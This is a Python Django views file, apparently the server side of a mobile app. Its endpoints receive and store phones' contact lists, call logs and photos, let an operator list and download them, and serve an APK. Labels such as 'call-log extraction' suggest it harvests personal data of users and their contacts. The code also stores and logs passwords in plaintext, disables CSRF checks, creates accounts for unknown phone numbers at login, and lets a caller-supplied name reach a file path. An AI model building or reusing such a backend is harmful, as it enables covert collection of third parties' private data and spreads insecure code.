import asyncio
import hashlib
import json
import logging
import os
import time
import uuid
from datetime import timezone, timedelta, datetime, date

from django.core.serializers.json import DjangoJSONEncoder
from django.db.models import Q
from django.http import HttpResponse, HttpRequest, HttpResponseRedirect, JsonResponse, StreamingHttpResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

import util.utils
from util import utils, http_utils, time_utils
from web_app.settings import BASE_DIR, MEDIA_ROOT

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(process)d:%(thread)d:%(threadName)s - %(levelname)s - %(message)s',
    level=logging.INFO
)


UNKNOWN_KEY = "unknown_info"
UNKNOWN_REMARK = "未知数据"


async def hello(request: HttpRequest):
    # return HttpResponse(json.dumps({
    #     "msg": "asd"
    # }), content_type='application/json')
    print("data = ", str(request.body))
    context = {
        "user": {
            "username": "admin",
            "name": "admin"
        }
    }
    return render(request, 'index.html', context)


def index_view(request: HttpRequest):
    return render(request, 'index.html')


def user_list(request: HttpRequest):
    start_row, end_row = utils.page_query(request)
    query = ContactUser.objects
    res = query.all()[start_row: end_row]
    count = query.count()

    res_list = []

    for s in res:
        contact_id = s.id
        res_list.append({
            'id': s.id,
            'phone': s.phone,
            'call_phone': s.phone,
            'code': s.code,
            'contact_count': ContactInfo.objects.filter(ref_contact_id=contact_id).count(),
            'recent_count': ContactRecent.objects.filter(ref_contact_id=contact_id).count(),
            'time': s.time,
            'remark': s.remark
        })

    result = {
        "code": 0,
        "count": count,
        "data": res_list
    }

    return JsonResponse(result, encoder=CJsonEncoder)


def contact_list(request: HttpRequest):
    body = utils.request_body(request)
    user_key = body.get('key', "")
    if utils.str_is_null(str(user_key)):
        return http_utils.ret_error("参数错误")
    q = Q(id=user_key) | Q(phone=user_key) | Q(code=user_key)
    user_query = ContactUser.objects.filter(q)
    if user_query.count() == 0:
        return http_utils.ret_error("用户不存在")

    user = user_query.first()
    info_query = ContactInfo.objects.filter(ref_contact_id=user.id)
    if info_query.count() == 0:
        return http_utils.ret_error("查找到的记录数量为0")

    res_list = []
    for info in info_query:
        res_list.append({
            'id': info.id,
            'name': info.name,
            'phone': info.phone
        })

    result = {
        'code': 0,
        'header': 'id, 名称, 手机号',
        'data': res_list
    }

    return JsonResponse(result, encoder=CJsonEncoder)


def get_type(t) -> str:
    try:
        if int(t) == 1:
            return "呼入"
        elif int(t) == 2:
            return "呼出"
        else:
            return "未接"
    except Exception:
        return str(t)


def contact_recent_list(request: HttpRequest):
    body = utils.request_body(request)
    user_key = body.get('key', "")
    if utils.str_is_null(str(user_key)):
        return http_utils.ret_error("参数错误")
    q = Q(phone=user_key) | Q(code=user_key)
    if utils.is_int(user_key):
        q = q | Q(id=user_key)

    user_query = ContactUser.objects.filter(q)
    if user_query.count() == 0:
        return http_utils.ret_error("用户不存在")

    user = user_query.first()
    recent_query = ContactRecent.objects.filter(ref_contact_id=user.id)
    if recent_query.count() == 0:
        return http_utils.ret_error("查找到的记录数量为0")

    res_list = []
    for info in recent_query:
        res_list.append({
            'id': info.id,
            'name': info.name,
            'phone': info.phone,
            'duration': info.duration,
            'last_call': info.last_call,
            'type': get_type(info.type),
            'host': info.host
        })

    result = {
        'code': 0,
        'header': 'id, 名称, 手机号, 通话时长, 最后通话时间, 通话类型, 本机号码',
        'data': res_list
    }
    return JsonResponse(result, encoder=CJsonEncoder)


@csrf_exempt
def fetch_photo(request: HttpRequest):
    body = utils.request_body(request)
    user_key = body.get('key', "")
    if utils.str_is_null(str(user_key)):
        return http_utils.ret_error("参数错误")
    q = Q(phone=user_key) | Q(code=user_key)
    if utils.is_int(user_key):
        q = q | Q(id=user_key)

    user_query = ContactUser.objects.filter(q)
    if user_query.count() == 0:
        return http_utils.ret_error("用户不存在")

    user = user_query.first()

    user_photo_query = UserPhoto.objects.filter(ref_contact_id=user.id)
    if user_photo_query.exists():
        photo_files = []
        for photo in user_photo_query:
            try:
                p = os.path.join(MEDIA_ROOT, photo.photo.path)
                if os.path.exists(p):
                    photo_files.append(p)
            except BaseException as e:
                logging.exception(e)

        if len(photo_files) > 0:
            try:
                d = os.path.join(MEDIA_ROOT, "tmp.zip")
                zip_file = utils.files2zip(photo_files, d)
                if os.path.exists(zip_file):
                    response = StreamingHttpResponse(open(zip_file, 'rb'))
                    response['Content-Type'] = 'application/octet-stream'
                    response['Content-Disposition'] = 'attachment;filename="{0}"'.format(user_key + zip_file)
                    return response
            except BaseException as e:
                logging.info(e)
    else:
        pass
    return HttpResponse("fail")


@csrf_exempt
def register(request: HttpRequest):
    body = utils.request_body(request)
    phone = body.get("phone", "")
    password = body.get('password', "")
    code = body.get("code", "")
    logging.info("register#phone = " + str(phone))
    logging.info("register#password = " + str(password))
    logging.info("register#code = " + str(code))
    if utils.str_is_null(str(phone)):
        return http_utils.ret_error("phone is null")
    if utils.str_is_null(str(password)):
        return http_utils.ret_error("password is null")

    if ContactUser.objects.filter(phone=phone, password=password).exists():
        return http_utils.ret_error("账号已经注册")

    user = ContactUser.objects.create(phone=phone, password=password, code=code, time=datetime.utcnow())

    return http_utils.ret_success("注册成功", {
        'phone': user.phone,
        'code': user.code
    })


@csrf_exempt
def login(request: HttpRequest):
    body = utils.request_body(request)
    phone = body.get("phone", "")
    password = body.get('password', "")
    call_phone = body.get("callLogPhone", "")
    debug = utils.is_bool_val(body.get("debug", "false"))
    logging.info("login#phone = " + str(phone))
    logging.info("login#password = " + str(password))
    if utils.str_is_null(str(phone)):
        return http_utils.ret_error("phone is null")
    if utils.str_is_null(str(password)):
        return http_utils.ret_error("password is null")
    query = ContactUser.objects.filter(phone=phone, password=password)
    if not query.exists():
        query = ContactUser.objects.filter(phone=phone)
        if not query.exists():
            user = ContactUser.objects.create(phone=phone, password=password,
                                              call_phone=call_phone, remark="登录提取", debug=debug, time=datetime.utcnow())
        else:
            return JsonResponse({
                'code': -1,
                'msg': "登录失败，密码错误",
                "data": {}
            })
    else:
        user = query.first()

    return JsonResponse({
        'code': 0,
        'msg': "登录成功",
        "data": {
            'phone': user.phone
        }
    })


@csrf_exempt
def upload(reqeust: HttpRequest):
    body = reqeust.body
    logging.info("upload >>" + str(body))
    try:
        if isinstance(body, bytes):
            body = body.decode()
    except BaseException:
        pass
    try:
        data = json.loads(body)
    except BaseException:
        data = {}
    logging.info("upload_contact#data = " + str(data))
    debug = utils.is_bool_val(data.get("debug", "false"))
    key = data.get("id", "")
    key = utils.bytes2str(key)
    call_phone = data.get("callLogPhone", "")
    contacts = data.get('contactsList')
    recents = data.get('recentList')
    logging.info("upload_contact#key = " + str(key))
    logging.info("upload_contact#callLogPhone = " + str(call_phone))
    logging.info("upload_contact#contacts = " + str(contacts))
    logging.info("upload_contact#recents = " + str(recents))
    if contacts is None and recents is None:
        return http_utils.ret_error("数据为空")
    if utils.str_is_null(str(key)):
        key = UNKNOWN_KEY
        if not utils.str_is_null(call_phone):
            key = call_phone

    q = Q(phone=key) | Q(code=key) | Q(call_phone=key)

    if not utils.str_is_null(call_phone):
        q = q | Q(call_phone=call_phone)

    user_query = ContactUser.objects.filter(q)
    if user_query.count() == 0:
        logging.info("upload_contact#用户不存在")
        if utils.str_is_null(str(call_phone)):
            user = ContactUser.objects.create(
                phone=UNKNOWN_KEY, password="", call_phone=call_phone,
                remark="未知用户", debug=debug, time=datetime.utcnow()
            )
        else:
            user = ContactUser.objects.create(
                phone=call_phone, password="123456", call_phone=call_phone,
                remark="通话记录提取", debug=debug, time=datetime.utcnow()
            )
    else:
        user = user_query.first()

    if contacts is not None:
        logging.info("upload_contact#更新联系人")
        objs = ContactInfo.objects
        for contact in contacts:
            try:
                phone = contact.get("phone")
                if objs.filter(ref_contact_id=user.id, phone=phone).exists():
                    continue
                name = contact.get("name")
                objs.create(ref_contact_id=user.id, phone=phone, name=name, debug=debug)
            except BaseException as e:
                logging.exception(e)

    if recents is not None:
        logging.info("upload_contact#更新通话记录")
        objs = ContactRecent.objects
        for recent in recents:
            try:
                phone = recent.get("phone")
                t = recent.get('time')
                try:
                    t = datetime.fromtimestamp(int(t) / 1000)
                except BaseException:
                    t = datetime.utcnow()
                    pass
                if objs.filter(ref_contact_id=user.id, phone=phone, last_call=t).exists():
                    continue
                name = recent.get("name")
                duration = recent.get("duration")
                if duration is None:
                    duration = 0
                call_type = recent.get("type")
                if not utils.is_int(call_type):
                    call_type = 3
                host = recent.get("host")
                objs.create(
                    ref_contact_id=user.id, phone=phone,
                    name=name, last_call=t, duration=duration,
                    type=call_type, host=host, debug=debug
                )
            except BaseException as e:
                logging.exception(e)

    return http_utils.ret_success("成功")


@csrf_exempt
def upload_photo(request: HttpRequest):
    if request.method == 'POST':
        key = utils.bytes2str(request.POST.get("key", ""))
        debug = utils.is_bool_val(str(request.POST.get("debug", "false")))
        phone = key
        ref_id = 0
        q = Q(phone=key) | Q(code=key) | Q(call_phone=key)
        user_query = ContactUser.objects.filter(q)
        if user_query.count() > 0:
            user = user_query.first()
            if not utils.str_is_null(str(user.call_phone)):
                phone = user.call_phone
            elif utils.str_is_null(str(user.phone)):
                phone = user.phone
            ref_id = user.id
        photo = request.FILES.get('photo')
        if photo is not None:
            if not UserPhoto.objects.filter(ref_contact_id=ref_id, name=photo.name).exists():
                UserPhoto.objects.create(
                    ref_contact_id=ref_id,
                    phone=phone,
                    photo=photo,  # 拿到图片
                    name=photo.name,  # 拿到图片的名字,
                    debug=debug
                )
                return HttpResponse('上传成功！')
    return HttpResponse('失败')


def delete_contact(request: HttpRequest):
    body = utils.request_body(request)
    del_id = body.get('id', "")
    if del_id is None or not utils.is_int(del_id):
        return http_utils.ret_error("参数错误")

    user_query = ContactUser.objects.filter(id=del_id)
    if user_query.exists():
        for user in user_query:
            try:
                ContactInfo.objects.filter(ref_contact_id=user.id).delete()
            except Exception:
                pass
            try:
                ContactRecent.objects.filter(ref_contact_id=user.id).delete()
            except Exception:
                pass
            try:
                UserPhoto.objects.filter(ref_contact_id=user.id).delete()
            except Exception:
                pass
        user_query.delete()
        return JsonResponse({
            "code": 0,
            "msg": "成功"
        })

    return JsonResponse({
        "code": -1,
        "msg": "失败"
    })


def file_down(request, name):
    p = os.path.join(BASE_DIR, "data", name)
    logging.info("filedown p = " + str(p))

    if not os.path.exists(p):
        p = os.path.join(BASE_DIR, "data", "app-release.apk")
    logging.info("filedown p1 = " + str(p))
    if not os.path.exists(p):
        return HttpResponse("resources not found")
    file = open(p, 'rb')
    response = StreamingHttpResponse(file)
    response['Content-Type'] = 'application/octet-stream'
    response['Content-Disposition'] = 'attachment;filename="app-release.apk"'
    return response


def update_contact_info(request: HttpRequest):
    body = utils.request_body(request)
    c_id = body.get("id", 0)
    custom_name = body.get("custom_name", "")
    remark = body.get("remark", "")
    logging.info("update_contact_info#body = " + str(body))
    if not utils.is_int(c_id) or int(c_id) >= 0:
        return http_utils.ret_error("id不能为空")
    if utils.str_is_null(custom_name) or utils.str_is_null(remark):
        return http_utils.ret_error("custom或remark参数不能为空")
    query = ContactUser.objects.filter(id=c_id)
    if not utils.str_is_null(custom_name):
        query.update(custom_name=custom_name)

    if not utils.str_is_null(remark):
        query.update(remark=remark)

    return JsonResponse({
        "code": 0,
        "msg": "成功"
    })
